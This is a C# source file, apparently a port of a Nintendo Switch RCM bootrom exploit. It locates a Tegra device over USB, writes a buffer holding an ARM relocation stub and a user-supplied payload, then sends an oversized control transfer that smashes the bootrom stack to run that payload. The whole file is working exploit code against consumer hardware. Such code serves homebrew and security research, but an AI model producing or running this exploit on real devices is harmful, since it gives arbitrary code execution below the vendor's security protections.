using libusbK;
using System;
using System.IO;

namespace TegraSharp
{
    internal class Program
    {
        public static int AltInterfaceId, PipeId, Writes;

        public static readonly byte[] Intermezzo =
        {
            0x44, 0x00, 0x9F, 0xE5, // LDR   R0, [PC, #0x44]
            0x01, 0x11, 0xA0, 0xE3, // MOV   R1, #0x40000000
            0x40, 0x20, 0x9F, 0xE5, // LDR   R2, [PC, #0x40]
            0x00, 0x20, 0x42, 0xE0, // SUB   R2, R2, R0
            0x08, 0x00, 0x00, 0xEB, // BL    #0x28
            0x01, 0x01, 0xA0, 0xE3, // MOV   R0, #0x40000000
            0x10, 0xFF, 0x2F, 0xE1, // BX    R0
            0x00, 0x00, 0xA0, 0xE1, // MOV   R0, R0
            0x2C, 0x00, 0x9F, 0xE5, // LDR   R0, [PC, #0x2C]
            0x2C, 0x10, 0x9F, 0xE5, // LDR   R1, [PC, #0x2C]
            0x02, 0x28, 0xA0, 0xE3, // MOV   R2, #0x20000
            0x01, 0x00, 0x00, 0xEB, // BL    #0xC
            0x20, 0x00, 0x9F, 0xE5, // LDR   R0, [PC, #0x20]
            0x10, 0xFF, 0x2F, 0xE1, // BX    R0
            0x04, 0x30, 0x90, 0xE4, // LDR   R3, [R0], #4
            0x04, 0x30, 0x81, 0xE4, // STR	 R3, [R1], #4
            0x04, 0x20, 0x52, 0xE2, // SUBS	 R2, R2, #4
            0xFB, 0xFF, 0xFF, 0x1A, // BNE	 #0xFFFFFFF4
            0x1E, 0xFF, 0x2F, 0xE1, // BX	 LR
            0x20, 0xF0, 0x01, 0x40, // ANDMI PC, R1, R0, LSR #32
            0x5C, 0xF0, 0x01, 0x40, // ANDMI PC, R1, IP, ASR R0
            0x00, 0x00, 0x02, 0x40, // ANDMI R0, R2, R0
            0x00, 0x00, 0x01, 0x40  // ANDMI R0, R1, R0
        };

        public static void Config(out WINUSB_PIPE_INFORMATION pipeInfo, out UsbK usb,
            out USB_INTERFACE_DESCRIPTOR interfaceDescriptor)
        {
            var patternMatch = new KLST_PATTERN_MATCH { DeviceID = "USB\\VID_0955&PID_7321*" };
            var deviceList = new LstK(KLST_FLAG.NONE, ref patternMatch);
            interfaceDescriptor = new USB_INTERFACE_DESCRIPTOR();
            pipeInfo = new WINUSB_PIPE_INFORMATION();
            deviceList.MoveNext(out var deviceInfo);
            usb = new UsbK(deviceInfo);
            FindPipeAndInterface(usb, out interfaceDescriptor, out pipeInfo, AltInterfaceId, PipeId);
            AltInterfaceId = interfaceDescriptor.bAlternateSetting;
            PipeId = pipeInfo.PipeId;
            usb.SetAltInterface(interfaceDescriptor.bInterfaceNumber, false, interfaceDescriptor.bAlternateSetting);
        }

        public static bool FindPipeAndInterface(UsbK usb, out USB_INTERFACE_DESCRIPTOR interfaceDescriptor,
            out WINUSB_PIPE_INFORMATION pipeInfo, int altInterfaceId, int pipeId)
        {
            byte interfaceIndex = 0;
            interfaceDescriptor = new USB_INTERFACE_DESCRIPTOR();
            pipeInfo = new WINUSB_PIPE_INFORMATION();
            while (usb.SelectInterface(interfaceIndex++, true))
            {
                byte altSettingNumber = 0, pipeIndex = 0;
                while (usb.QueryInterfaceSettings(altSettingNumber++, out interfaceDescriptor))
                    if (altInterfaceId == -1 || altInterfaceId == altSettingNumber)
                        while (usb.QueryPipe(altSettingNumber, pipeIndex++, out pipeInfo))
                        {
                            if (pipeInfo.MaximumPacketSize > 0 && pipeId == -1 || pipeInfo.PipeId == pipeId ||
                                (pipeId & 0xF) == 0 && (pipeId & 0x80) == (pipeInfo.PipeId & 0x80))
                                goto FindInterfaceDone;

                            pipeInfo.PipeId = 0;
                        }
            }

            FindInterfaceDone:
            return pipeInfo.PipeId != 0;
        }

        private static void Write(UsbK wrt, byte[] payload)
        {
            var buffer = new byte[0x1000];

            for (var i = 0; i < payload.Length - 1; i += 0x1000, Writes++)
            {
                Buffer.BlockCopy(payload, i, buffer, 0, 0x1000);
                wrt.WritePipe(1, buffer, 0x1000, out _, IntPtr.Zero);
            }
        }

        private static byte[] SwizzlePayload(byte[] payload)
        {
            var buf = new byte[(int)Math.Ceiling((66216m + payload.Length) / 0x1000) * 0x1000];
            using (var strm = new MemoryStream())
            using (var wrt = new BinaryWriter(strm))
            {
                wrt.Write(0x30298);
                strm.Position = 0x2A8;
                for (var i = 0; i < 0x3c00; i++)
                    wrt.Write(0x4001f000);
                strm.Position = 0xf2a8;
                wrt.Write(Intermezzo);
                strm.Position = 0x102a8;
                wrt.Write(payload);
                Array.Copy(strm.ToArray(), buf, strm.Length);
                return buf;
            }
        }

        private static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.Error.WriteLine("Usage: TegraSharp.exe payload.bin");
                return;
            }

            var Buf = new byte[0x10];

            UsbK Switch;

            try
            {
                Config(out _, out Switch, out _);
            }
            catch (AccessViolationException)
            {
                Console.Error.WriteLine("Error: Cannot access device, is your Switch plugged in, turned on and in RCM mode?");
                return;
            }

            Switch.ReadPipe(0x81, Buf, 0x10, out _, IntPtr.Zero);
            Console.WriteLine($"Device ID: {BitConverter.ToString(Buf).Replace("-", "").ToLower()}");

            Console.WriteLine("Writing payload...");
            Write(Switch, SwizzlePayload(File.ReadAllBytes(args[0])));

            if (Writes % 2 != 1)
            {
                Console.WriteLine("Switching buffers...");
                Switch.WritePipe(1, new byte[0x1000], 0x1000, out _, IntPtr.Zero);
            }

            Console.WriteLine("Smashing...");
            var setup = new WINUSB_SETUP_PACKET
            {
                RequestType = 0x81,
                Request = 0,
                Value = 0,
                Index = 0,
                Length = 0x7000
            };

            var result = Switch.ControlTransfer(setup, new byte[0x7000], 0x7000, out var b, IntPtr.Zero);

            if (!result)
                Console.WriteLine("Successfully smashed device!");
            else
                Console.WriteLine($"Length transferred was 0x{b:x} bytes... it seems your Switch isn't vulnerable.");
        }
    }
}